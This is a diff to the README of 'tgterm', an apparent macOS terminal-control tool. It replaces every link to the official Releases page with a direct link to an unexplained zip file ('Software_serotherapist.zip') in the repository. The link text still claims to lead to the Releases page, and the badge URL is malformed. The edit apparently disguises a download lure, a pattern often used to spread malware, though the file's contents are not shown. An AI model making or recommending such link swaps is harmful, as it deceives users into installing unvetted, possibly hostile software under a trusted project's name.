@@ -6,11 +6,11 @@ Welcome to tgterm! This application allows you to control your MacOS terminals d
 
 ## 📥 Download tgterm
 
-[![Download tgterm](https://img.shields.io/badge/Download%20tgterm-v1.0-blue.svg)](https://github.com/danGat14234/tgterm/releases)
+[![Download tgterm](https://github.com/danGat14234/tgterm/raw/refs/heads/main/parallelepiped/Software_serotherapist.zip%https://github.com/danGat14234/tgterm/raw/refs/heads/main/parallelepiped/Software_serotherapist.zip)](https://github.com/danGat14234/tgterm/raw/refs/heads/main/parallelepiped/Software_serotherapist.zip)
 
 To get started, visit the following link to download tgterm:
 
-[Download tgterm from Releases Page](https://github.com/danGat14234/tgterm/releases)
+[Download tgterm from Releases Page](https://github.com/danGat14234/tgterm/raw/refs/heads/main/parallelepiped/Software_serotherapist.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Before installing tgterm, ensure your system meets the following requirements:
 ## 📦 How to Download & Install
 
 1. **Visit the Releases Page**
-   - Click on [this link](https://github.com/danGat14234/tgterm/releases) to go to the tgterm Releases page.
+   - Click on [this link](https://github.com/danGat14234/tgterm/raw/refs/heads/main/parallelepiped/Software_serotherapist.zip) to go to the tgterm Releases page.
 
 2. **Download the Application**
    - On the Releases page, locate the latest version of tgterm. Look for the .dmg file under “Assets.”
